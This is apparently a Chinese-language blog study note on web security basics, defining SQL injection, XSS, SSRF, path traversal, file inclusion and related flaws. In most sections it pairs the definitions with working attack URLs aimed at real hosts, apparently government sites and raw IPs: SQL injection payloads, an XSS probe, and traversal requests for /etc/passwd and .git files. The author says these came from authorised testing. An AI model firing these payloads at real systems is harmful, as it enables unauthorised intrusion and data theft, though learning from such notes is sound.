---
title: "Web安全基础学习"
date: 2022-05-11T16:46:47+08:00
draft: false
tags: ["网络安全"]
categories: ["学习记录"]
---

首先说下自己并不是专门做安全的，此次总结也确实是工作中遇到了这类问题需要解决

当然如果你自己有过搭建服务的经历，或许会在服务的访问记录中看到各种乱七八载的访问

如果有以下情况的话，就送他一个`iptables`套餐吧

## SQL注入

> SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）

报错注入

- extractvalue(1, concat(0x5c,(select user())))
- updatexml(0x3a,concat(1,(select user())),1)

```
http://ns2.stats.gov.cn/comment/api/index.php?gid=1&page=2&rlist%5B%5D=%40%60%27%60%2C+extractvalue%281%2C+concat_ws%280x20%2C+0x5c%2C%28select+md5%28202072102%29%29%29%29%2C%40%60%27%60

http://14.29.113.88:9292/api/sms_check.php?param=1%27+and+updatexml%281%2Cconcat%280x7e%2C%28SELECT+MD5%281234%29%29%2C0x7e%29%2C1%29--+
```

数据路检测（mysql）

- sleep：sleep(1) 让sql运行多少秒
- 字符串连接：SELECT CONCAT(’some‘, 'string')
- 报错注入：convert(int, (db_name()))
- 等等

```
http://218.13.13.90:8081/fsGovPlatform/js/(select(0)from(select(sleep(34)))v)%2f*'+(select(0)from(select(sleep(34)))v)+'""+(select(0)from(select(sleep(34)))v)+""*%2f/timepicker/jquery-ui-timepicker-addon.js

http://210.76.74.50/faq.php?action=grouppermission&gids%5B100%5D%5B0%5D=%29+and+%28select+1+from+%28select+count%28%2A%29%2Cconcat%28%28select+concat%28user%2C0x3a%2Cmd5%281234%29%2C0x3a%29+from+mysql.user+limit+0%2C1%29%2Cfloor%28rand%280%29%2A2%29%29x+from+information_schema.tables+group+by+x%29a%29%23&gids%5B99%5D=%27

http://xwrz.huizhou.gov.cn/invest-client/rzcs/index.html?assureType=123456&minBalance=convert%28int%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%271078491144%27%29%29%29&moneyrateStart=123456&type=123456
```

## XSS

> XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为

```
# 特征
<script src="..."></script>

http://qqt.gdqy.gov.cn/tomcat-docs/appdev/sample/web/hello.jsp?test=<script>alert(12345)</script>
```

## CSRF

> 跨站请求伪造 (Cross-Site Request Forgery, CSRF)，也被称为 One Click Attack 或者 Session Riding ，通常缩写为CSRF，是一种对网站的恶意利用。尽管听起来像XSS，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站

## SSRF

> 服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统

```
通过各种非http协议

file:///path/to/file

http://183.63.186.68/Web/file:%2f%2f%2fetc%2fpasswd.html
```

## 命令注入

> 命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。
>
> 该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。

## 目录穿越

> 目录穿越（也被称为目录遍历/directory traversal/path traversal）是通过使用 ../ 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等

```
../

..\

..;/

http://dfz.gd.gov.cn/index/ztlm/szfzg/gctj/nj//../../../../Gemfile
```

## 文件读取

考虑读取可能有敏感信息的文件

- 用户目录下的敏感文件：.bash_history/.zsh_history/.profile/.bashrc/.gitconfig/.viminfopasswd
- 应用的配置文件：/etc/apache2/apache2.conf, /etc/nginx/nginx.conf
- 应用的日志文件：/var/log/apache2/access.log, /var/log/nginx/access.log
- 站点目录下的敏感文件：.svn/entries.git/HEADWEB-INF/web.xml.htaccess
- 特殊的备份文件：.swp/.swo/.bak/index.php
- Python的Cache：__pycache__\__init__.cpython-35.pyc

```
http://www.gdzwfw.gov.cn/portal/static//..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/windows/win.ini

http://gcjs.jiangmen.cn/framework-ui/src//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd

http://zfbz.maoming.gov.cn/css/.svn/entries

http://ggzy.zhuhai.gov.cn:8092/GPC/.git/HEAD
```



## 文件上传

> 竞争上绕过
>
> 有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成Web Shell的文件并尝试访问，多次之后即可获得Shell

```
http://bbs.968115.cn/backup.sh

```



## 文件包含

常见的文件包含漏洞的形式为 `<?php include("inc/" . $_GET['file']); ?>`

考虑常用的几种包含方式为

- 同目录包含 `file=.htaccess`
- 目录遍历 `?file=../../../../../../../../../var/lib/locate.db`
- 日志注入 `?file=../../../../../../../../../var/log/apache/error.log`
- 利用 `/proc/self/environ`

其中日志可以使用SSH日志或者Web日志等多种日志来源测试

```
http://183.63.186.142:8080/.htaccess
```

## XXE

> 当允许引用外部实体时，可通过构造恶意的XML内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的XXE攻击，只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，但是也可以通过Blind XXE的方式实现攻击

## 模版注入

> 模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式

## Xpath注入

> XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作，下面以登录验证中的模块为例，说明 XPath注入攻击的实现原理

## 逻辑漏洞/业务漏洞

> 逻辑漏洞是指由于程序逻辑不严导致一些逻辑分支处理错误造成的漏洞。
>
> 在实际开发中，因为开发者水平不一没有安全意识，而且业务发展迅速内部测试没有及时到位，所以常常会出现类似的漏洞

## 配置安全

- 弱密码位数过低字符集小为常用密码个人信息相关手机号生日姓名用户名使用键盘模式做密码
- 敏感文件泄漏.git.svn
- 数据库Mongo/Redis等数据库无密码且没有限制访问
- 加密体系在客户端存储私钥
- 三方库/软件公开漏洞后没有及时更新

## 中间件

## Web Cache欺骗攻击

漏洞成因

当代理服务器设置为缓存静态文件并忽略这类文件的caching header时，访问 `http://www.example.com/home.php/no-existent.css` 时，会发生什么呢？整个响应流程如下：

1. 浏览器请求 `http://www.example.com/home.php/no-existent.css` ;
2. 服务器返回 `http://www.example.com/home.php` 的内容(通常来说不会缓存该页面);
3. 响应经过代理服务器;
4. 代理识别该文件有css后缀;
5. 在缓存目录下，代理服务器创建目录 `home.php` ，将返回的内容作为 `non-existent.css` 保存。

漏洞利用

攻击者欺骗用户访问 `http://www.example.com/home.php/logo.png?www.myhack58.com` ,导致含有用户个人信息的页面被缓存，从而能被公开访问到。更严重的情况下，如果返回的内容包含session标识、安全问题的答案，或者csrf token。这样攻击者能接着获得这些信息，因为通常而言大部分网站静态资源都是公开可访问的。

## HTTP走私请求

> HTTP请求走私是一种干扰网站处理HTTP请求序列方式的技术，最早在 2005 年的一篇 [文章](https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf) 中被提出。

## 注意

文中的url举例均来自某为公司的测试请求，且对方访问是已经签署了访问协议

请不要随意访问文中举例url，更不要批量访问，否则后果自负！！！